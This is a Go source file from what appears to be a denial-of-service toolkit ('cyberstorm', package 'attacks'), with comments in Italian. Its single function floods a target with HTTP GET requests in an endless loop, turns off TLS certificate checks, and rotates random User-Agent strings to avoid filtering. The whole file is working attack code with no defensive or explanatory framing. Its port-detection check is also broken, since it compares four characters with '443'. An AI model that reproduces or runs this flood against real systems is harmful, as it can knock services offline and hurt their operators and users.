package attacks

import (
	"context"
	"crypto/tls"
	"log"
	"net/http"
	"sync"

	"cyberstorm/core"
)

// SendHTTPGet invia richieste HTTP GET in un ciclo finché il contesto non viene cancellato
func SendHTTPGet(target string, userAgent string, wg *sync.WaitGroup, ctx context.Context) {
	defer wg.Done()

	// Aggiunge http:// o https:// al target in base alla porta
	if target[:4] != "http" {
		if target[:4] == "443" {
			target = "https://" + target
		} else {
			target = "http://" + target
		}
	}

	// Ignora i certificati non validi (per HTTPS)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{}

	for {
		select {
		case <-ctx.Done():
			log.Println("HTTP GET flood interrotto.")
			return
		default:
			// Se non è specificato un User-Agent, scegliamo uno casuale
			if userAgent == "" {
				userAgent = core.GetRandomUserAgent()
			}

			// Crea la richiesta HTTP GET
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				log.Printf("Errore nella creazione della richiesta HTTP GET: %v", err)
				continue
			}

			// Imposta il User-Agent
			req.Header.Set("User-Agent", userAgent)

			// Esegue la richiesta
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Errore nella richiesta HTTP GET: %v", err)
				continue
			}
			resp.Body.Close()
		}
	}
}
